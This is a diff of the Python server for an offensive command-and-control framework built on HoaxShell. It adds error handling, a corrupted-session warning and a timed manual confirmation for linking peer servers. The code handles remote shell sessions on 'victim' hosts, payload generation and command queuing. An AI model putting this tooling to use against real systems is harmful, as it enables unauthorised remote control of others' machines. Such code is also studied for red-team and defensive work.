@@ -1,7 +1,9 @@
-#!/bin/python3
+#!/usr/bin/env python3
 #
-# Author: Panagiotis Chartas (t3l3machus)
-# https://github.com/t3l3machus
+# Author: Panagiotis Chartas (t3l3machus) | https://github.com/t3l3machus
+#
+# This script is part of the firaga framework.
+
 
 import ssl, sys, argparse, base64, re, os, socket
 import netifaces as ni
@@ -10,7 +12,7 @@ from warnings import filterwarnings
 from datetime import date, datetime
 from IPython.display import display
 from threading import Thread, Event, BoundedSemaphore
-from time import sleep
+from time import sleep, time
 from ipaddress import ip_address
 from subprocess import check_output
 from string import ascii_uppercase, ascii_lowercase
@@ -126,41 +128,9 @@ class Payload_generator:
 				print('Required argument LHOST not provided.')
 				return	
 			
-			
-
-			# ~ ''' Parse FREQUENCY'''
-			# ~ if 'frequency' in arguments:
-				
-				# ~ try:
-					# ~ frequency = float(args_dict['frequency'])
-				
-				# ~ except:
-					# ~ print('Error parsing FREQUENCY. Invalid type.')
-					# ~ return
-								
-				# ~ if frequency < 0.8:
-					# ~ print('Error parsing FREQUENCY. Value should be greater than or equal to 0.8')
-					# ~ return		
-					
-			# ~ else:	
+	
 			frequency = Hoaxshell_settings.default_frequency
 			
-			
-			
-			# ~ ''' Parse HEADER '''
-			# ~ if 'header' in arguments:
-				
-				# ~ # Check provided header name for illegal chars	
-				# ~ valid = ascii_uppercase + ascii_lowercase + '-_'
-				
-				# ~ for char in args_dict['header']:
-					# ~ if char not in valid:
-						# ~ print(f'HEADER value includes illegal character "{char}".')
-						# ~ return 1
-				
-				# ~ Hoaxshell_settings._header = args_dict['header']
-
-
 
 			''' Parse EXEC_OUTFILE '''		
 			if 'exec_outfile' in arguments:
@@ -175,61 +145,20 @@ class Payload_generator:
 				exec_outfile = False
 
 
-			# ~ ''' Parse OBFUSCATE '''
-			# ~ support = ['windows']
-			# ~ obf_level = False
-			
-			# ~ if args_dict['os'] in support:
-				# ~ if 'obfuscate' in arguments:
-					
-					# ~ try:
-						# ~ obf_level = int(args_dict['obfuscate'])
-						
-					# ~ except:
-						# ~ print('Error parsing OBFUSCATE. Invalid type.')
-						# ~ return 1
-				
-					# ~ if not ((obf_level >= 1) and (obf_level <=2)):
-						# ~ print('Obfuscate value can be between 1-2.')
-						# ~ return 1
-						
-			# ~ else:
-				# ~ print(f'Ignoring argument "obfuscate" (not supported for {args_dict["os"]} payloads)')
-
-
-
-
 			''' Parse BOOLEAN '''
 			
 			for item in self.boolean_args.keys():
 				if item in arguments:
 					if item in self.supported[os_type]:
 						self.boolean_args[item] = True
-					
-						# ~ if args_dict[item] == 'true':
-							# ~ boolean_args[item] = True
-							
-						# ~ elif args_dict[item] == 'false':
-							# ~ boolean_args[item] = False
-							
-						# ~ else:
-							# ~ print(f'Invalid value for {boolean_args[item]} (type: BOOLEAN).')
-							# ~ return 1
-							
-					# ~ else:
-						# ~ boolean_args[item] = False
+
 					else:
 						print(f'Ignoring argument "{item}" (not supported for {os_type} payloads)')
-				# ~ else:
-					# ~ print(f'Ignoring undefined argument "{item}".')
-
-				
+		
 			
 			if (os_type == 'linux'):
 				self.boolean_args['constraint_mode'] = True
-				self.boolean_args['trusted_domain'] = True
-				# ~ exec_outfile = False
-				# ~ encode = False
+				self.boolean_args['trusted_domain'] = False
 
 			lhost = f'{lhost}:{Hoaxshell_settings.bind_port}' if not Hoaxshell_settings.ssl_support else f'{lhost}:{Hoaxshell_settings.bind_port_ssl}'
 
@@ -567,16 +496,9 @@ class Sessions_manager:
 		
 		if len(self.active_sessions.keys()):
 			
-			print('\r')
-			
-			# ~ for session in self.active_sessions.keys():
-				# ~ alias = self.active_sessions[session]['alias']
-				# ~ session_id = alias if alias is not None else session
-				# ~ print(f'{session_id}  {self.active_sessions[session]["ip"]}  {self.active_sessions[session]["OS Type"]}  {self.active_sessions[session]["Owner"]}  {self.active_sessions[session]["Status"]}')
-
+			print('\r')			
 			table = self.sessions_dict_to_list()
-			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'User', 'Owner', 'Status'])
-			
+			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'User', 'Owner', 'Status'])			
 			print('\r')
 		
 		else:
@@ -591,11 +513,21 @@ class Sessions_manager:
 		for session_id in self.active_sessions.keys():
 			
 			tmp = self.active_sessions[session_id].copy()
-			tmp['Session ID'] = session_id if not tmp['aliased'] else tmp['alias']
-			tmp['Owner'] = 'Self' if tmp['self_owned'] else Core_server.sibling_servers[tmp['Owner']]['Hostname']
-			tmp['User'] = f"{tmp['Computername']}\\{tmp['Username']}" if tmp['OS Type'] == 'Windows' else f"{tmp['Username']}@{tmp['Computername']}"
-			sessions_list.append(tmp)
-		
+			corrupted = 0
+			
+			try:
+				tmp['Session ID'] = session_id if not tmp['aliased'] else tmp['alias']
+				tmp['Owner'] = 'Self' if tmp['self_owned'] else Core_server.sibling_servers[tmp['Owner']]['Hostname']
+				tmp['User'] = f"{tmp['Computername']}\\{tmp['Username']}" if tmp['OS Type'] == 'Windows' else f"{tmp['Username']}@{tmp['Computername']}"
+				sessions_list.append(tmp)
+				
+			except KeyError:
+				corrupted += 1
+			
+		if corrupted:
+			print(f'\r[{WARN}] {corrupted} x Corrupted session data entries omitted.')
+			print(f'[{WARN}] Possible reason: Incomplete payload execution on victim.\n')
+				
 		return sessions_list
 		
 
@@ -707,29 +639,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			if sibling_signature:
 				output = output.replace('{' + sibling_signature + '}', '')
 								
-			# ~ tmp = output.rsplit("Path", 1)
-			# ~ output = tmp[0]
-			# ~ junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
-			# ~ output = output.rsplit("Drive", 1)[0] if junk else output
-			
-			# ~ if self.active_shell:
-				
-				# ~ if self.init_dir == None:
-					# ~ p = tmp[-1].strip().rsplit("\n")[-1]
-					# ~ p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
-					# ~ self.init_dir = p
-											
-				# ~ if not exec_outfile: # delete			
-					# ~ p = tmp[-1].strip().rsplit("\n")[-1]
-					# ~ p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
-					
-				# ~ else:
-					# ~ p = Hoaxshell.init_dir
-					
-				# ~ self.shell_prompt = f"PS {p}> "
-				# ~ self.set_shell_prompt_ready()
-				# ~ self.rst_promt_required = False
-
 			
 		except UnicodeDecodeError:
 			print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
@@ -767,16 +676,16 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		
 		try:
 			
-			while Hoaxshell.active_shell:
+			while Hoaxshell.active_shell: #and (Sessions_manager.active_sessions[session_id]['Status'] == 'Active'):
 				
 				if Hoaxshell.prompt_ready:
-					
+				
 					user_input = input(prompt).strip()					
 					
 					if user_input.lower() in ['clear']:
 						os.system('clear')
 
-					elif user_input.lower() in ['exit', 'quit', 'q']:
+					elif user_input.lower() in ['exit', 'quit']:
 						raise KeyboardInterrupt
 
 					elif user_input == '':
@@ -784,7 +693,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 					else:
 
-						if Hoaxshell.active_shell: #@@@
+						if Hoaxshell.active_shell:
 							
 							Hoaxshell.prompt_ready = False
 							
@@ -794,19 +703,16 @@ class Hoaxshell(BaseHTTPRequestHandler):
 								
 							else:	
 								Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
-							# ~ Hoaxshell.prompt_ready = False
-
 
 						else:
 							print(f'\r[{INFO}] No active session.')		
-									
-					# ~ Hoaxshell.prompt_ready = False
-				
+												
 				else:
-					# ~ sleep(0.15)
 					continue
-		
-		
+			
+			else:
+				raise KeyboardInterrupt
+			
 		
 		except KeyboardInterrupt:
 			print('\rShell deactivated.')
@@ -823,8 +729,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		Main_prompt.main_prompt_ready = True	
 
 
-
-	def rst_shell_prompt(self, force_rst = False, prompt = ' > ', prefix = '\r'):
+	@staticmethod
+	def rst_shell_prompt(force_rst = False, prompt = ' > ', prefix = '\r'):
 		
 		Hoaxshell.prompt_ready = True
 		# ~ sys.stdout.write(prefix + prompt + readline.get_line_buffer())
@@ -835,8 +741,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		timestamp = int(datetime.now().timestamp())		
 
-		# Identify session
-		
+		# Identify session		
 		if not Hoaxshell.header_id:
 			header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
 			Hoaxshell.header_id = f'X-{header_id_extract[0]}'
@@ -870,7 +775,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				}
 				
 				Hoaxshell.command_pool[session_id] = []
-				return
+				# ~ return
 				# ~ Hoaxshell.rst_promt_required = True
 				
 		elif session_id and (session_id in Sessions_manager.active_sessions.keys()):
@@ -890,9 +795,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		url_split = self.path.strip("/").split("/")
 		#if (self.path.strip("/") in Hoaxshell.verify) and legit:
 		if url_split[0] in Hoaxshell.verify and legit:
-			
+			print(f'\r[{INFO}] Received "Verify execution"')
 			if Sessions_manager.active_sessions[session_id]['execution_verified']:
-				print('\rReceived "Verify execution" request from an already established session (ignored).')
+				print(f'\r[{INFO}] Received "Verify execution" request from an already established session (ignored).')
 				Main_prompt.rst_prompt(force_rst = True)
 				return
 			
@@ -951,7 +856,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 	def do_POST(self):
 		
-		# ~ global prompt
 		timestamp = int(datetime.now().timestamp())
 		session_id = self.headers.get(self.header_id)
 		legit = True if (session_id in Sessions_manager.legit_session_ids.keys()) else False
@@ -978,7 +882,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					
 					if isinstance(output, str):	
 						print(f'\r{GREEN}{output}{END}')
-						Main_prompt.rst_prompt(force_rst = True) if not self.active_shell else self.rst_shell_prompt(force_rst = True)
+						Main_prompt.rst_prompt(force_rst = True) if not self.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
 					
 					elif isinstance(output, list):
 						Core_server.send_receive_one_encrypted(output[0], output[1], 'command_output')
@@ -990,7 +894,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					
 					if isinstance(output, str):
 						print(error_msg)
-						Main_prompt.rst_prompt(force_rst = True) if not self.active_shell else self.rst_shell_prompt(force_rst = True)
+						Main_prompt.rst_prompt(force_rst = True) if not self.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
 						
 					elif isinstance(output, list):
 						Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output')
@@ -1096,7 +1000,7 @@ def initiate_hoax_server():
 
 		# Check if both cert and key files were provided
 		if (Hoaxshell_settings.certfile and not Hoaxshell_settings.keyfile) or (Hoaxshell_settings.keyfile and not Hoaxshell_settings.certfile):
-			exit_with_msg('SSL support seems to be misconfigured (missing key or cert file).')
+			exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')
 
 		# Start http server
 		port = Hoaxshell_settings.bind_port if not Hoaxshell_settings.ssl_support else Hoaxshell_settings.bind_port_ssl
@@ -1105,10 +1009,10 @@ def initiate_hoax_server():
 			httpd = HTTPServer((Hoaxshell_settings.bind_address, port), Hoaxshell)
 
 		except OSError:
-			exit(f'[{FAILED}] {BOLD}Port {port} seems to already be in use.{END}\n')
+			exit(f'[{DEBUG}] Hoaxshell HTTP server failed to start. {BOLD}Port {port} seems to already be in use.{END}\n')
 		
 		except:
-			exit(f'\n[{FAILED}] HTTP server failed to start (Unknown error occurred).\n')
+			exit(f'\n[{DEBUG}] Hoaxshell HTTP server failed to start (Unknown error occurred).\n')
 
 		if Hoaxshell_settings.ssl_support:
 			httpd.socket = ssl.wrap_socket (
@@ -1135,6 +1039,7 @@ class Core_server:
 	
 	acknowledged_servers = []
 	sibling_servers = {}
+	requests = {}
 	SERVER_UNIQUE_ID = str(uuid4()).replace('-', '')
 	HOSTNAME = socket.gethostname()
 	listen = True
@@ -1142,7 +1047,7 @@ class Core_server:
 	CONNECT_SYN = b'\x4f\x86\x2f\x7b'
 	CONNECT_ACK = b'\x5b\x2e\x42\x6d'
 	CONNECT_DENY = b'\x3c\xc3\x86\xde'
-		
+	core_initialized = None
 			
 	@staticmethod	
 	def return_server_uniq_id():
@@ -1157,30 +1062,52 @@ class Core_server:
 			raw_data = conn.recv(Core_server_settings.CLIENT_BUFFER_SIZE)
 			Main_prompt.main_prompt_ready = False
 
-			# There are 3 defined byte sequences for recognizing a sibling server's request to connect (something like a TCP handshake but significantly more stupid)
+			# There are 3 predefined byte sequences for processing a sibling server's request to connect (something like a TCP handshake but significantly more stupid)
 			# Check if raw_data is a connection request
-			if raw_data in [self.CONNECT_SYN, self.CONNECT_ACK, self.CONNECT_DENY]:
+			if raw_data in [self.CONNECT_SYN, self.CONNECT_DENY]:
 					
 				if raw_data == self.CONNECT_SYN:
 					
-					# ~ response_choice = input(f"[{INFO}] Received request to connect from {ORANGE}{address}{END}. If you wish to connect type {ORANGE}{self.SERVER_UNIQUE_ID[0:6]}{END} and press ENTER: ")
+					request_id = ''.join(["{}".format(randint(0, 9)) for num in range(0, 5)])
+					self.requests[request_id] = False
+					# ~ response_choice = input(f"\r[{INFO}] Received request to connect from {ORANGE}{address}{END}. \nIf you wish to connect type {ORANGE}{self.SERVER_UNIQUE_ID[0:6]}{END} and press ENTER: ")
+					print(f"\r[{INFO}] Received request to connect from {ORANGE}{address}{END}.")
+					print(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to connect. You have 10 seconds.")
+					Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
 					
-					if True: #response_choice == self.SERVER_UNIQUE_ID[0:6]:
-						Main_prompt.set_main_prompt = False
-						self.acknowledged_servers.append(address[0])
-						conn.send(self.CONNECT_ACK) #.encode('utf-8', 'ignore')
-						
+					timeout_start = time()
+
+					while time() < timeout_start + 10:
+				
+						if self.requests[request_id]:							
+							del self.requests[request_id]
+							self.acknowledged_servers.append(address[0])
+							conn.send(self.CONNECT_ACK) #.encode('utf-8', 'ignore')							
+							break
+							
 					else:
+						del self.requests[request_id]
 						conn.send(self.CONNECT_DENY)
-					
+						conn.close()						
+						print(f"\r[{INFO}] Request to connect with {ORANGE}{address}{END} denied.")
+						Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
+								
+					# ~ if response_choice == self.SERVER_UNIQUE_ID[0:6]:
+						# ~ Main_prompt.set_main_prompt = False
+						# ~ self.acknowledged_servers.append(address[0])
+						# ~ conn.send(self.CONNECT_ACK) #.encode('utf-8', 'ignore')
+						
+					# ~ else:
+						# ~ conn.send(self.CONNECT_DENY)
+						# ~ conn.close()
 				return
 					
 			
 			# If the sender's IP address is in the list of acknowledged for connection servers and the msg is a valid UUID4, then establish connection
 			elif address[0] in self.acknowledged_servers:
-				
+
 				str_data = raw_data.decode('utf-8', 'ignore').strip()
-				
+
 				# Try to interpret the clear text data
 				try:
 					tmp = str_data.split(':')
@@ -1349,8 +1276,14 @@ class Core_server:
 			server_socket.bind((Core_server_settings.bind_address, Core_server_settings.bind_port))
 					
 		except OSError:
-			exit_with_msg('Core server failed to establish socket.')
-			
+			self.core_initialized = False
+			exit_with_msg(f'Core server failed to start. {BOLD}Port {Core_server_settings.bind_port} seems to already be in use.{END}\n')
+		
+		except:
+			self.core_initialized = False
+			exit_with_msg('Core server failed to start (Unknown error occurred).\n')
+		
+		self.core_initialized = True	
 		print(f'\r[{INFO}] Core server listening on {ORANGE}{Core_server_settings.bind_address}{END}:{ORANGE}{Core_server_settings.bind_port}{END}')
 
 		# Start listening for connections
@@ -1406,7 +1339,7 @@ class Core_server:
 	   
 
 	@staticmethod
-	def send_receive_one(msg, server_ip, server_port, encode_msg, timeout = 4):
+	def send_receive_one(msg, server_ip, server_port, encode_msg, timeout = 5):
 		
 		try:
 			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
@@ -1540,19 +1473,8 @@ class Core_server:
 
 
 
-	# ~ def share_sibling_servers_info(self, sibling_id):
-		
-		# ~ # AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
-		# ~ sibling_servers_data_local = str(self.encapsulate_dict(self.sibling_servers, 'synchronize_sibling_servers_table'))
-		# ~ sibling_servers_data_local_encrypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_data_local, sibling_id[0:16].encode('utf-8'))
-		# ~ sibling_servers_data_remote_encrypted = self.send_receive_one(sibling_servers_data_local_encrypted, self.sibling_servers[sibling_id]['Server IP'], self.sibling_servers[sibling_id]['Server Port'], encode_msg = False)
-		# ~ sibling_servers_data_remote_decrypted = decrypt_msg(sibling_id.encode('utf-8'), sibling_servers_data_remote_encrypted, self.SERVER_UNIQUE_ID[0:16].encode('utf-8'))
-		# ~ decapsulated = self.decapsulate_dict(sibling_servers_data_remote_decrypted) # returns [capsule, received_data]
-		# ~ self.update_siblings_data_table(decapsulated[1])
-
-
 	@staticmethod
-	def send_receive_one_encrypted(sibling_id, data_dict, capsule, timeout = 4):
+	def send_receive_one_encrypted(sibling_id, data_dict, capsule, timeout = 5):
 		
 		# AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
 		server_unique_id = Core_server.return_server_uniq_id()
@@ -1628,13 +1550,15 @@ class Core_server:
 		# Init connect
 		if authorized:
 			
-			response = self.send_receive_one(self.CONNECT_SYN, server_ip, server_port, encode_msg = False)
+			response = self.send_receive_one(self.CONNECT_SYN, server_ip, server_port, encode_msg = False, timeout = 11)
 			
 			if response == 'connection_refused':
-				return print(f'\r[{FAILED}] Connection refused.')
+				print(f'\r[{FAILED}] Connection refused.')
+				return
 				
 			elif response == 'timed_out':
-				return print(f'\r[{FAILED}] Connection timed out.')
+				print(f'\r[{FAILED}] Connection timed out.')
+				return
 
 			elif response == self.CONNECT_ACK:
 				response = self.send_receive_one(f'{self.SERVER_UNIQUE_ID}:{Core_server_settings.bind_port}:{self.HOSTNAME}', server_ip, server_port, encode_msg = True)
@@ -1646,7 +1570,8 @@ class Core_server:
 					self.sibling_servers[sibling_id] = {'Hostname': sibling_hostname, 'Server IP' : server_ip, 'Server Port' : server_port, 'Status' : f'Active'}
 						
 				else:
-					return print('Connection request failed.')
+					print(f'\r[{FAILED}] Connection request failed.')
+					return
 						
 				print('\rConnection established!\r')
 				
@@ -1655,8 +1580,9 @@ class Core_server:
 					siblings_status_monitor.daemon = True
 					siblings_status_monitor.start()
 					
-		# ~ Main_prompt.main_prompt_ready = True
-		
+			elif response == self.CONNECT_DENY:	
+				print(f'\r[{FAILED}] Request to connect denied.')
+
 		
 
 	@staticmethod	
